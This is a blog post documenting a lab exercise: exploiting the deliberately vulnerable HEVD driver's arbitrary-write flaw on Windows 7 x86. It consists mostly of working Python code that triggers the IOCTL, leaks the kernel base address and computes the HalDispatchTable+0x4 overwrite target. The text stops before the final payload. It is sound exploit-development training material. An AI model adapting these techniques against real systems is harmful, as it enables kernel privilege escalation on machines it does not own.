---
layout: single
title: HEVD Exploits -- Windows 7 x86 Arbitrary Write
date: 2020-01-28
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows
  - x86
  - x86-64
  - Shellcoding
  - Kernel Exploitation
  - Write What Where
  - Arbitrary Overwrite
---

## Introduction
Continuing on with the Windows exploit journey, it's time to start exploiting kernel-mode drivers and learning about writing exploits for ring 0. As I did with my OSCE prep, I'm mainly blogging my progress as a way for me to reinforce concepts and keep meticulous notes I can reference later on. I can't tell you how many times I've used my own blog as a reference for something I learned 3 months ago and had totally forgotten. 

This series will be me attempting to run through every exploit on the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver). **I will be using HEVD 2.0**. I can't even begin to explain how amazing a training tool like this is for those of us just starting out. There are a ton of good blog posts out there walking through various HEVD exploits. I recommend you read them all! I referenced them heavily as I tried to complete these exploits. Almost nothing I do or say in this blog will be new or my own thoughts/ideas/techniques. There were instances where I diverged from any strategies I saw employed in the blogposts out of necessity or me trying to do my own thing to learn more.

**This series will be light on tangential information such as:**
+ how drivers work, the different types, communication between userland, the kernel, and drivers, etc
+ how to install HEVD,
+ how to set up a lab environment
+ shellcode analysis

The reason for this is simple, the other blog posts do a much better job detailing this information than I could ever hope to. It feels silly writing this blog series in the first place knowing that there are far superior posts out there; I will not make it even more silly by shoddily explaining these things at a high-level in poorer fashion than those aforementioned posts. Those authors have way more experience than I do and far superior knowledge, I will let them do the explaining. :)

This post/series will instead focus on my experience trying to craft the actual exploits. 

I used the following blogs as references:
+ All of the blog posts referenced in the [previous post](https://github.com/h0mbre/h0mbre.github.io/blob/master/_posts/2020-01-21-HEVD_Stackoverflow_64bit.md),
+ FuzzySecurity's [tutorial on this very exploit](https://www.fuzzysecurity.com/tutorials/expDev/15.html),
+ GradiusX [exploit code for a similar exploit](https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py),
+ Abatchy's [post on the subject](https://www.abatchy.com/2018/01/kernel-exploitation-7),
+ jNizM [documentation for the SystemInformationModule returned structures](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f). 

Huge thanks to the blog authors, no way I could've finished these first two exploits without your help/wisdom. 

## Goal
For this post, I will only be concerned with creating a functional exploit. The code will be ugly, but it will work. In the next post, when we port our exploit to x86-64, I will worry about cleaning the code up, utilizing classes to define data structures and maybe even make the portable for both 32 and 64-bit Windows 7. 

## Getting IOCTL with IDA
First and foremost, we need to use IDA to determine the IOCTL code we need to interact with our desired function. This actually isn't that hard this time since we already determined the IOCTL for the overflow last blog post and our new desired function is very close to that one. 

![](/assets/images/AWE/arboverwrite.PNG)

So that's where we want to end up, let's backtrace a few steps and see what we can deduce about the IOCTL.

![](/assets/images/AWE/arbflow.PNG)

This lower box here, is directly connected to our desired function. So in this lower box, if we hit that `jz` opcode, we will end up in our function. You can see that there are two `sub eax, 4` operations that lead to this `jz`. The box immediately out of frame and directly connected to the upper box is actually our `jz` to the stack overflow function. That IOCTL was `0x222003`. So we can summarize the flow as thus:
+ if we subtract `0x222003` from our IOCTL and we don't get `0x0`, 
+ subtract another `0x4`. If we don't get `0x0`,
+ subtract another `0x4`. If we get `0x0`, jump to the Arbitrary Write function.

So we can deduce that `0x222003` + `0x4` + `0x4` is our desired IOCTL. This gives us `0x22200B`. Like we did last post, let's set a breakpoint on our function, send our IOCTL and see if we hit our breakpoint.

Going to pause the debuggee, and rerun our standby commands we always run on our debugger:
+ `sympath\+ <path to the HEVD.pdb file>` <— adds the symbols for HEVD to our symbols path
+ `.reload` <— reloads symbols from path
+ `ed Kd_DEFAULT_Mask 8` <— enables kernel debugging
+ `bp HEVD!ArbitraryOverwriteIoctlHandler` <— sets a breakpoint on our desired function

We'll use this script to send a buffer of 1000 `A` characters. 
```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32

def send_buf():
    hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", 
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)
    
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))

    buf = "A" * 1000
    buf_length = len(buf)
    
    result = kernel32.DeviceIoControl(
        hevd,
        0x22200b,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )

    if result != 0:
        print("[*] Buffer sent to driver successfully.")
    else:
        print("[!] Payload failed. Last error: " + str(GetLastError()))

send_buf()
```

We can see that we hit our breakpoint! Awesome, let's actually analyze what this function inside the IOCTL handler, `TriggerArbitraryOverwrite`, is doing now in WinDBG. 

![](/assets/images/AWE/bphit.PNG)

## Analyzing `TriggerArbitraryOverwrite`
If we look at the debug statements, this is what we get: 
```
kd> g
[+] UserWriteWhatWhere: 0x0187D65C
[+] WRITE_WHAT_WHERE Size: 0x8
[+] UserWriteWhatWhere->What: 0x41414141
[+] UserWriteWhatWhere->Where: 0x41414141
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```

We sent 1000 A chars, and we see that the `What` we are writing is `0x41414141`. Ok, this seems fine, its obviously taken 4 bytes out of our sent string and is treating them as a 4 byte object to write somewhere. The somewhere is also `0x41414141` as we see it is labeled as the `Where`. Let's step through the function to figure out how this works in the disassembly. 

We'll set a breakpoint on `bp HEVD!TriggerArbitraryOverwrite` and we'll resend the payload. Once we hit our break and then step through a bit we come upon the meat of the function, the highlighted line in the disassembler and the one after it. Let's take a look at these two operations and our register values. 

![](/assets/images/AWE/interesante.PNG)

We can see we're about to execute a `mov eax, dword ptr [edi]` instruction. Looking at the registers, EDI is set currently to `0x41414141`. This operation will definitely fail. There is no mapped memory at `0x41414141` so there is no value there for it to be stored in EAX. This is very different from `mov eax, edi`. What we're doing here is taking a pointer, EDI, and moving the pointer value there to EAX. Very interesting, we can definitely leverage this to write whatever we want I think based on everything we learned last posts. We can simply have EDI point to a pointer that points to our shellcode. 

The next instruction is `mov dword ptr [ebx], eax`. Wow ok, so this will then take that pointer we fed EAX and put it in the memory address EBX is pointing to. We can see from the register values we also control EBX since it's also `0x41414141`. So we not only control what will be written, but where it will be written. Let's go consult the smart people about how to use this to gain code execution. 

Spoiler alert, these two 4-byte groupings are just the first 8 bytes of our buffer. 

## Turning a Read and a Write into Code Execution
After consulting the elders, (blog posts of FuzzySec, Abatchy, etc), we see that a way you can exploit this is to overwrite a function pointer that is called with ring 0 privileges and then invoke that function. Luckily, such a function exists and [this methodology](http://shinnai.altervista.org/papers_videos/ECFID.pdf) is pretty seasoned at this point. 

I'm not going to spend a bunch of time explaining the underlying concepts here, the referenced blog posts do a great job of that. Please go read them, at a bare minimum read the FuzzySec and Abatchy blogs. At a high-level, we will use a routine within the `HalDispatchTable` (an abstraction layer for hardware interactions), `HaliQuerySystemInformation`, which is rarely used.

This function resides at offset `0x4` within the `HalDispatchTable`. Abatchy breaks it down as follows in WinDBG, this is straight from his blog:
```
kd> dd HalDispatchTable     
82970430  00000004 828348a2 828351b4 82afbad7
82970440  00000000 828455ba 829bc507 82afb3d8
82970450  82afb683 8291c959 8295d757 8295d757
82970460  828346ce 82834f30 82811178 82833dce
82970470  82afbaff 8291c98b 8291caa1 828350f6
82970480  8291caa1 8281398c 8281b4f0 82892c8c
82970490  82af8d7f 00000000 82892c9c 829b3c1c
829704a0  00000000 82892cac 82af8f77 00000000

kd> ln 828348a2 
Browse module
Set bu breakpoint

(828348a2)   hal!HaliQuerySystemInformation   |  (82834ad0)   hal!HalpAcpiTimerInit
Exact matches:
    hal!HaliQuerySystemInformation (<no parameter info>)
```

So if we found the address of the `HalDispatchTable`, we could increase the address by `0x4` and know exactly where `HaliQuerySystemInformation` resides and we could overwrite it. 

This is great, but we still need a way to invoke the function. This can apparently be accomplished by leveraging the `KeQueryIntervalProfile` function which calls a DWORD pointer at `HalDispatchTable+0x4`. `KeQueryIntervalProfile` can be reached by calling `NtQueryIntervalProfile` a rarely used undocumented API. Thank you to Fuzzy and Abatchy for this portion. 

## Finding the Address of `HalDispatchTable+0x4`
For this portion, I would've been utterly lost without two resources: FuzzySec's [`Get-SystemModuleInformation`](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-SystemModuleInformation.ps1) Windows Powershell script and a GradiusX [exploit code for a similar exploit that uses bitmaps to achieve the same end result.](https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1607/HEVD_arbitraryoverwrite.py)

Between these two examples, I was able to cobble together a Frankenstein Python script that took bits and pieces from both examples and then also things I came up with that made more sense to me. Because I couldn't just straight up use what they had written, I had to make my own way and that helped a lot. 

We have a task ahead of us. We have to find the address of the `HalDispatchTable`. At a high-level, we can accomplish this by:
+ finding the kernel image base address,
+ grabbing a handle to the kernel image by using `LoadLibraryA`,
+ grabbing the userland `HalDispatchTable` address by using `GetProcAddress` with our kernel image handle,
+ and finally subtracting the kernel image handle from our userland `HalDispatchTable` address and then adding the kernel base address. 

### Finding Kernel Base
This can apparently be accomplished by using `NtQuerySystemInformation` (which can be found somewhat documented [here](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation)). The prototype is this:
```C
__kernel_entry NTSTATUS NtQuerySystemInformation(
  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
  OUT PVOID                   SystemInformation,
  IN ULONG                    SystemInformationLength,
  OUT PULONG                  ReturnLength
);
```

For the `SystemInformationClass` parameter, we will be using the `SystemModuleInformation` argument. My saving grace throughout this portion was some documentation on the structures of this API [here](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f). No way I finish this exploit without this help. 

Looking at the documentation, `SystemModuleInformation` is `0x000B`. So we'll use the value `0xb` for this parameter. Let's start a new separate script that will just gather all the address information we need, we'll kick it off by calling `NtQuerySystemInformation`. Right now our script looks like this: 
```python
def base():
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
    system_information = create_string_buffer(0)
    system_information_length = c_ulong(0)
    ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    system_information = create_string_buffer(system_information_length.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    if result == 0x00000000:
        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))
        
    elif result == 0xC0000004:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")

    elif result == 0xC0000005:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")

    else:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))
 ```

Some parts that need explaining here: I just took the hardcoded error codes from FuzzySec's Powershell script and hardcoded them here. You'll notice that we call the API twice, now why is that? Well, we don't know the buffer length for the output parameters yet. So we'll call it twice: 
+ 1st, the API call ends in an error because we have tried to stuff our results into a 0-sized buffer
+ 2nd, we get the returned length in `system_information_length` and then we can call the API again with the correct buffer length by re-establishing the `system_information` string buffer with `system_information = create_string_buffer(system_information_length.value)`.

FuzzySec accomplishes this by putting his API calls into a `while True` loop with a `break` on success and GradiusX does basically what I did and calls the API twice. 

If you look at the MSDN and githubgist documentation, `system_information` is now a struct of type `_SYSTEM_MODULE_INFORMATION`. This prototype is broken down thusly:
```C
struct _SYSTEM_MODULE_INFORMATION // Size=284
{
    ULONG Count; // Size=4 Offset=0
    SYSTEM_MODULE Modules[1]; // Size=280 Offset=4
};
```

Nice, that's easy enough, let's take a look at this goddamn `SYSTEM_MODULE` member:
```C
typedef struct _SYSTEM_MODULE // Size=280
{
    USHORT Reserved1; // Size=2 Offset=0
    USHORT Reserved2; // Size=2 Offset=2
    ULONG ImageBaseAddress; // Size=4 Offset=4
    ULONG ImageSize; // Size=4 Offset=8
    ULONG Flags; // Size=4 Offset=12
    USHORT Index; // Size=2 Offset=16
    USHORT Rank; // Size=2 Offset=18
    USHORT LoadCount; // Size=2 Offset=20
    USHORT NameOffset; // Size=2 Offset=22
    UCHAR Name[256]; // Size=256 Offset=24
} SYSTEM_MODULE;
```

Whew, thats quite a lot, but helpfully the size and offsets are annotated in the documentation. Sidenote: `sizeof(ctypes.c_ulong())` on Linux is 8 bytes but on Windows it's 4 bytes, WTF?

So what we have now is `system_information` returned to us in the form of a `_SYSTEM_MODULE_INFORMATION` struct. GradiusX convienantly hardcoded a class definition in his script for this struct and I've put it in my final commented script, feel free to use it (I did not, I am very unsmart.)

Somehow, the first 4 bytes of this returned struct is the amount of handles to Images returned, I'm still not understanding 100% how this works. I can't account for these 4 bytes in the documentation. If we call our script we have right now, I get this returned in my terminal: 
```
C:\Users\IEUser\Desktop>python address.py
[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
[*] Success, allocated 52828-byte result buffer.
```

So we now have the length of the returned structure (52828 bytes). If we slice off the first eight bytes of this returned struct, which by the way, I treated as a long string in Python, we can actually store those 8 bytes in a buffer and get their decimal value with the following code thanks to GradiusX: 
```python
handle_num = c_ulong()
memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
```
If we append this to our script and run it, we get the following terminal output:
```
C:\Users\IEUser\Desktop>python address.py
[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
[*] Success, allocated 52828-byte result buffer.
[*] Result buffer contains 186 SystemModuleInformation objects
```

We can do some math now. We returned 186 SystemModuleInformation objects. Each object is 284 bytes according to the documentation. That brings us to 52824 bytes. So there we have it, we have something like: 4 bytes telling us how many objects returned and then 52824 bytes of 284 byte structs. This makes sense to me, I just don't know where we can find those initial 4 bytes, let me know if you know please. 

Moving on, let's just slice those first four bytes off so we can deal with the remaining objects which are all instances of `_SYSTEM_MODULE_INFORMATION` stucts!

We can parse them accordingly! Let's redefine `system_information` without the first 4 bytes: 
```python
system_information = create_string_buffer(system_information[8:])
```

Since we know the offsets, we can just hardcode them and treat `system_information` as a long string. Let's parse the string using our offsets from the documentation and just return every single `ImageName` member of the struct. We can see from the documentation that this member is `256` bytes long and is located at offset `+0x24`. And this struct is `280` bytes long. So we can keep a counter variable that will increment every iteration `280` bytes and we can get a list of the module names with the `ImageName` member. Let's see if this works and then we will know positively that we can parse the struct the way we need to. This can be accomplished with the following loop in our exploit script: 
```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32
ntdll = windll.ntdll

def address_find():
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
    system_information = create_string_buffer(0)
    system_information_length = c_ulong(0)
    ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    system_information = create_string_buffer(system_information_length.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    if result == 0x00000000:
        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))

    elif result == 0xC0000004:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")

    elif result == 0xC0000005:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")

    else:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))

    handle_num = c_ulong()
    memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))

    system_information = create_string_buffer(system_information[8:])

    counter = 0
    for x in range(0,handle_num.value):
        image_name = system_information[counter + 24: counter + 284].strip("\x00")
        print(image_name)
        counter += 284

address_find()
```

Running this gives me the following terminal output:
```
C:\Users\IEUser\Desktop>python address.py
[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
[*] Success, allocated 52828-byte result buffer.
[*] Result buffer contains 186 SystemModuleInformation objects
\SystemRoot\system32\ntkrnlpa.exe
\SystemRoot\system32\halmacpi.dll
\SystemRoot\system32\kdcom.dll
\SystemRoot\system32\mcupdate_GenuineIntel.dll
\SystemRoot\system32\PSHED.dll
\SystemRoot\system32\BOOTVID.dll
\SystemRoot\system32\CLFS.SYS
\SystemRoot\system32\CI.dll
\SystemRoot\system32\drivers\Wdf01000.sys
\SystemRoot\system32\drivers\WDFLDR.SYS
\SystemRoot\system32\drivers\ACPI.sys
\SystemRoot\system32\drivers\WMILIB.SYS
...[snip]...
```

It looks like we can parse this struct reasonably well with our offsets and treating it as a string with our loop. Granted this part was super confusing for me because of mystery 4 bytes, but this worked pretty reliably. We returned the names of every module. We're interested in this first entry `ntkrnlpa.exe`. That's the kernel image and if we find that in our loop, we should then go find it's base address which is held in that struct's `ULONG ImageBaseAddress` member at offset `0x4`. 

So what we'll do, is iterate over our returned struct grabbing out image names, if the image name has `ntkrnl` in the string, we will go to that struct's `0x4` offset and grab the address which spans to offset `0x8`. This can accomplished with the following loop, replacing our old loop:
```python
counter = 0
    for x in range(0,handle_num.value):
        image_name = system_information[counter + 24: counter + 284].strip("\x00")
        if "ntkrnl" in image_name:
            image_name = image_name.split("\\")[-1]
            print("[*] Kernel Type: {}".format(image_name))            
            base = c_ulong()
            memmove(addressof(base), create_string_buffer(system_information[counter + 4: counter + 8]), sizeof(base))
            kernel_base = hex(base.value)
            if kernel_base[-1] == "L":
                kernel_base = kernel_base[:-1]
                print("[*] Kernel Base: {}".format(kernel_base))
                return image_name, kernel_base
        counter += 284
```

Running this in the terminal gives me the following output:
```
C:\Users\IEUser\Desktop>python address.py
[*] Calling NtQuerySystemInformation w/SystemModuleInformation class
[*] Success, allocated 52828-byte result buffer.
[*] Result buffer contains 186 SystemModuleInformation objects
[*] Kernel Type: ntkrnlpa.exe
[*] Kernel Base: 0x82850000
```

Awesome, we actually returned the kernel image base address. We can now proceed with our plans. (I used the FuzzySec powershell script throughout this process to make sure my returned values were correct). 

That was probably the hardest part, now we need to make a few API calls to get a handle to the kernel (`LoadLibraryA`) and also we need the userland `HalDispatchTable` (`GetProcAddress`). 

We will also need to calculate the address of `HalDispatchTable` in kernel space using FuzzySec's math we already outlined. 

Let's add everything to our first script with the `send_buf` function commented out for now. We're now here:
```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32
ntdll = windll.ntdll

def address_find():
    print("[*] Calling NtQuerySystemInformation w/SystemModuleInformation class" )
    system_information = create_string_buffer(0)
    system_information_length = c_ulong(0)
    ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    system_information = create_string_buffer(system_information_length.value)

    result = ntdll.NtQuerySystemInformation(
        0xb,
        system_information,
        len(system_information),
        addressof(system_information_length)
    )

    if result == 0x00000000:
        print("[*] Success, allocated {}-byte result buffer.".format(str(len(system_information))))

    elif result == 0xC0000004:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)")

    elif result == 0xC0000005:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)")

    else:
        print("[!] NtQuerySystemInformation failed. NTSTATUS: {}").format(hex(result))

    handle_num = c_ulong()
    memmove(addressof(handle_num), create_string_buffer(system_information[:8]), sizeof(handle_num))
    print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))

    system_information = create_string_buffer(system_information[8:])

    counter = 0
    for x in range(0,handle_num.value):
        image_name = system_information[counter + 24: counter + 284].strip("\x00")
        if "ntkrnl" in image_name:
            image_name = image_name.split("\\")[-1]
            print("[*] Kernel Type: {}".format(image_name))            
            base = c_ulong()
            memmove(addressof(base), create_string_buffer(system_information[counter + 4: counter + 8]), sizeof(base))
            kernel_base = hex(base.value)
            if kernel_base[-1] == "L":
                kernel_base = kernel_base[:-1]
                print("[*] Kernel Base: {}".format(kernel_base))
                return image_name, kernel_base
        counter += 284

def hal_calc(image_name, kernel_base):

    # grab a handle to ntkrnl
    kern_handle = kernel32.LoadLibraryA(image_name)
    if kern_handle == None:
        print("[!] LoadLibrary failed to retrieve handle to kernel with error: {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Kernel Handle: {}".format(hex(kern_handle)))

    # use our handle to get the address of the HalDispatchTable in userland
    userland_hal = kernel32.GetProcAddress(kern_handle, "HalDispatchTable")
    if userland_hal == None:
        print("[!] GetProcAddress failed to retrieve HDT address with error: {}".format(str(GetLastError())))
        sys.exit(1)
    print("[*] Userland HalDispatchTable Address: {}".format(hex(userland_hal)))

    # using FuzzySec's powershell script as guide for math: $HalDispatchTable = $HALUserLand.ToInt32() - $KernelHanle + $KernelBase
    kernel_hal = userland_hal - kern_handle + int(kernel_base, 16)
    printable_hal = hex(kernel_hal)
    if printable_hal[-1] == "L":
        printable_hal = printable_hal[:-1]
    print("[*] Kernel HalDispatchTable Address: {}".format(printable_hal))

    # we want hal + 0x4, that's the function pointer we want to overwrite
    target_hal = kernel_hal + 0x4
    print("[*] Target HalDispatchTable Function Pointer at: {}".format(hex(target_hal)[:-1]))

    return target_hal


def send_buf():
    hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", 
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)
    
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))

    buf = "A" * 1000
    buf_length = len(buf)
    
    result = kernel32.DeviceIoControl(
        hevd,
        0x22200b,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )

    if result != 0:
        print("[*] Buffer sent to driver successfully.")
    else:
        print("[!] Payload failed. Last error: " + str(GetLastError()))

image_name, kernel_base = address_find()
hal_calc(image_name, kernel_base)
```








